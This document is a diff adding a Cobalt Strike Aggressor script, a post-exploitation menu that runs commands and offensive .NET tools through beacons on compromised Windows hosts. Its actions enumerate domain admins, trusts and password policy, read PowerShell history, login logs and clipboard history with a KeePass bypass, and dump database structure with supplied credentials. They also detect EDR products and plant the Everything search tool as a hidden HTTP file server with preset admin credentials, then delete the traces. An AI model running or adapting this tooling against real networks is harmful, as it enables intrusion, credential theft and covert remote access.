@@ -1,0 +1,329 @@
+menu "Information collection" {
+menu "Common stand-alone commands" {
+item "systeminfo" {
+$bid = $1['@'];
+bshell($bid, "systeminfo");
+}
+item "whoami /all" {
+$bid = $1['@'];
+bshell($bid, "whoami /all");
+}
+item "ipconfig /all" {
+$bid = $1['@'];
+bshell($bid, "ipconfig /all");
+}
+item "View routing table" {
+$bid = $1['@'];
+bshell($bid, "route print");
+}
+item "View arp cache" {
+$bid = $1['@'];
+bshell($bid, "arp -A");
+}
+item "View user information" {
+$bid = $1['@'];
+bshell($bid, "net user");
+}
+item "View installation program and version information" {
+$bid = $1['@'];
+bshell($bid, "wmic product get name,version");
+}
+item "View installed patches" {
+$bid = $1['@'];
+bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
+}
+item "View running processes and paths" {
+$bid = $1['@'];
+bshell($bid, "wmic process get caption,executablepath,commandline");
+}
+item "View process details" {
+$bid = $1['@'];
+bshell($bid, "wmic process get caption,commandline,processid /value");
+}
+item "View services" {
+$bid = $1['@'];
+bshell($bid, "wmic service list brief");
+}
+item "View firewall configuration" {
+$bid = $1['@'];
+bshell($bid, "netsh firewall show config");
+}
+item "View scheduled tasks" {
+$bid = $1['@'];
+bshell($bid, "schtasks.exe");
+}
+item "View scheduled task details" {
+$bid = $1['@'];
+bshell($bid, "schtasks /query /fo LIST /v");
+}
+item "View startup program information" {
+$bid = $1['@'];
+bshell($bid, "wmic startup get command,caption");
+}
+item "View online users" {
+$bid = $1['@'];
+bshell($bid, "query user || qwinsta");
+}
+item "View boot time" {
+$bid = $1['@'];
+bshell($bid, "net statistics workstation");
+}
+item "View PowerShell v5 historical commands" {
+$bid = $1['@'];
+bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
+}
+item "View recently used items" {
+$bid = $1['@'];
+bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
+}
+item "View SMB pointing path" {
+$bid = $1['@'];
+bshell($bid, "wmic share get name,path");
+}
+}
+
+menu "Common commands in domain environment" {
+menu "AdFind (query domain information)" {
+item "Upload AdFind" {
+$bid = $1;
+$dialog = dialog("Upload AdFind", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &AdFind_upload);
+dialog_description($dialog,"AdFind is used to query information within the domain. Project address: http://www.joeware.net/freetools/tools/adfind/index.htm");
+drow_text($dialog, "UploadPath", "Upload path: ");
+dbutton_action($dialog, "Upload");
+dialog_show($dialog);
+}
+sub AdFind_upload {
+bcd($bid, $3['UploadPath']);
+bupload($bid, script_resource("/scripts/Information collection/AdFind.exe"));
+}
+item "List domain controller names" {
+$bid = $1['@'];
+bshell($bid, "AdFind.exe -sc dclist");
+}
+item "Query online computers in the current domain" {
+$bid = $1['@'];
+bshell($bid, "AdFind.exe -sc computers_active");
+}
+item "Query online computers in the current domain (only display name and operating system)" {
+$bid = $1['@'];
+bshell($bid, "AdFind.exe -sc computers_active name operatingSystem");
+}
+item "Query all computers in the current domain" {
+$bid = $1['@'];
+bshell($bid, "AdFind.exe -f \"objectcategory=computer\"");
+}
+item "Query all computers in the current domain (only display name and operating system)" {
+$bid = $1['@'];
+bshell($bid, "AdFind.exe -f \"objectcategory=computer\" name operatingSystem");
+}
+item "Query all users in the domain" {
+$bid = $1['@'];
+bshell($bid, "AdFind.exe -users name");
+}
+item "Query all GPOs" {
+$bid = $1['@'];
+bshell($bid, "AdFind.exe -sc gpodmp");
+}
+item "Delete AdFind" {
+$bid = $1['@'];
+bshell($bid, "del /f /s /q AdFind.exe");
+}
+}
+
+item "Query domain" {
+$bid = $1['@'];
+bshell($bid, "net view /domain");
+}
+item "View domain management" {
+$bid = $1['@'];
+bshell($bid, "net group \"domain admins\" /domain");
+}
+item "View domain user details" {
+prompt_text("Enter domain user name", "", lambda({bshell(@bid, "net user $1 /domain");}, @bid => $bid));
+}
+item "View current login domain" {
+$bid = $1['@'];
+bshell($bid, "net config workstation");
+}
+item "View time server" {
+$bid = $1['@'];
+bshell($bid, "net time /domain");
+}
+item "Display the computer list of the current domain" {
+$bid = $1['@'];
+bshell($bid, "net view");
+}
+item "View the domain administrator logged in to this machine" {
+$bid = $1['@'];
+bshell($bid, "net localgroup administrators /domain");
+}
+item "View all domain users" {
+$bid = $1['@'];
+bshell($bid, "net user /domain");
+}
+item "View the list of all user groups in the domain" {
+$bid = $1['@'];
+bshell($bid, "net group /domain");
+}
+item "View the primary domain controller" {
+$bid = $1['@'];
+bshell($bid, "netdom query pdc");
+}
+item "View the domain controller list" {
+$bid = $1['@'];
+bshell($bid, "net group \"Domain Controllers\" /domain");
+}
+item "View domain controller host name" {
+$bid = $1['@'];
+bshell($bid, "Nslookup -type=SRV _ldap._tcp");
+}
+item "Get domain trust information" {
+$bid = $1['@'];
+bshell($bid, "nltest /domain_trusts");
+}
+item "Get domain password information" {
+$bid = $1['@'];
+bshell($bid, "net accounts /domain");
+}
+item "View a list of all domain member computers" {
+$bid = $1['@'];
+bshell($bid, "net group \"domain computers\" /domain");
+}
+item "View all computers in the domain" {
+prompt_text("Enter host name", "", lambda({bshell(@bid, "net view /domain:$1");}, @bid => $bid)); } }
+
+	item "SharpChassisType (determine the host type)" {
+$bid = $1['@'];
+$dialog = dialog("SharpNetCheck", %(bid => $bid), &SharpChassisType);
+dialog_description($dialog,"Used to determine the current machine type (desktop computer, laptop, etc.). Project address: https://github.com/RcoIl/CSharp-Tools/");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub SharpChassisType{
+bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpChassisType.exe"), "");
+}
+
+item "SharpEventLog (get system login log)" {
+$bid = $1;
+$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
+dialog_description($dialog, "Read all computer information of failed or successful logins (4624, 4625) that have logged into the local machine, and quickly locate the operation and maintenance management personnel during intranet penetration. Project address: https://github.com/uknowsec/SharpEventLog");
+drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub SharpEventLog {
+bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpEventLog.exe"), $3['EventLogType']);
+}
+
+item "SharpCheckInfo(Get multiple host information)" {
+$bid = $1;
+$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
+dialog_description($dialog, "Collect target host information, including recently opened files, system environment variables, and Recycle Bin files, etc. Project address: https://github.com/uknowsec/SharpCheckInfo");
+drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub SharpCheckInfo {
+bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpCheckInfo.exe"), $3['Type']);
+}
+
+	item "SharpSQLDump (Quickly List Database Data)" {
+$bid = $1['@'];
+$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
+dialog_description($dialog, "Quickly obtain all database names, table names, and column names in the intranet penetration. After specific judgment, go to the data to save time. Applicable to mysql, mssql. Project address: https://github.com/uknowsec/SharpSQLDump");
+drow_text($dialog, "host", "host: ");
+drow_text($dialog, "username", "username: ");
+drow_text($dialog, "password", "password: ");
+drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub SharpSQLDump {
+$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
+bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpSQLDump.exe"), $arg);
+}
+
+item "SharpClipHistory(Get win10 clipboard)" {
+$bid = $1;
+$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpClipHistory);
+dialog_description($dialog, "Can be used to read the contents of the user's clipboard history in Windows 10 starting from the 1809 Build version. A blank type option means reading. Project address: https://github.com/FSecureLABS/SharpClipHistory");
+drow_combobox($dialog, "Type", "Type:", @("--help","","--checkOnly","--enableHistory","--saveImages","--keepassBypass"));
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub SharpClipHistory {
+bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpClipHistory.exe"), $3['Type']);
+}
+
+item "SharpAVKB(Antivirus and Patch Comparison)" {
+$bid = $1;
+$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
+dialog_description($dialog, "Windows antivirus comparison and patch number comparison. Project address: https://github.com/uknowsec/SharpAVKB");
+drow_combobox($dialog, "type", "type:", @("-AV", "-KB"));
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub SharpAVKB {
+bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpAVKB.exe"), $3['type']);
+}
+
+item "SharpEDRChecker (Get EDR Information)" {
+$bid = $1['@'];
+btask($bid, "Check running processes, process metadata, Dlls loaded into the current process and each DLL metadata, common installation directories, installed services and each service binary metadata, installed drivers and each driver metadata, all of which exist for known defensive products such as AV, EDR, and logging tools. It is also possible to capture hidden EDRs through its metadata check. Project address: https://github.com/PwnDexter/SharpEDRChecker", "");
+bexecute_assembly($1, script_resource("/scripts/Information collection/SharpEDRChecker.exe"), "");
+}
+
+	item "SharpDir (file search)" {
+$bid = $1['@'];
+$dialog = dialog("File search", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
+dialog_description($dialog, "File search, three search methods, specify file name, set file name search suffix, search for specified suffix file. Project address: https://github.com/jnqpblc/SharpDir");
+drow_text($dialog, "path", "path: ");
+drow_text($dialog, "file", "file: ");
+dbutton_action($dialog, "Run");
+dialog_show($dialog);
+}
+sub SharpDir {
+$arg = join(' ', @($3['path'],$3['file']));
+bexecute_assembly($bid, script_resource("/scripts/Information collection/SharpDir.exe"), $arg);
+}
+
+menu "Everything (Create http service file search)" {
+item "Upload Everything" {
+$bid = $1;
+$dialog = dialog("Upload Everything", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &evething);
+dialog_description($dialog, "Run without any pop-up window, software address: https://www.voidtools.com/zh-cn/");
+drow_text($dialog, "UploadPath", "Upload path: ");
+dbutton_action($dialog, "Upload");
+dialog_show($dialog);
+}
+sub evething {
+bcd($bid, $3['UploadPath']);
+bupload($bid, script_resource("/scripts/Information collection/everything/Everything.exe"));
+bupload($bid, script_resource("/scripts/Information collection/everything/Everything.ini"));
+}
+
+item "Run Everything"{
+$bid = $1['@'];
+$Dialog = dialog("Run Evething",%(bid => $bid),&Evething_run);
+dialog_description($Dialog, "Run without any pop-up window or tray display, automatically enable http service. Port: 65535, User: admin, Password: admin@123");
+btask($bid, "Run without any pop-up window or tray display, automatically enable http service. Access web service: http://ip:65535, User: admin, Password: admin@123", "");
+dbutton_action($Dialog, "Run");
+dialog_show($Dialog);
+}
+sub Evething_run{
+bshell($bid, "Everything.exe");
+}
+item "Stop Everything"{
+local('$bid');
+foreach $bid ($1){
+bshell($1, "taskkill -f /im Everything.exe");
+}
+}
+item "Delete Everything"{
+local('$bid');
+foreach $bid ($1){
+bshell($1, "taskkill -f /im Everything.exe & del /f /s /q Everything.exe & del /f /s /q Everything.ini"); } } }
+
+
+
+}
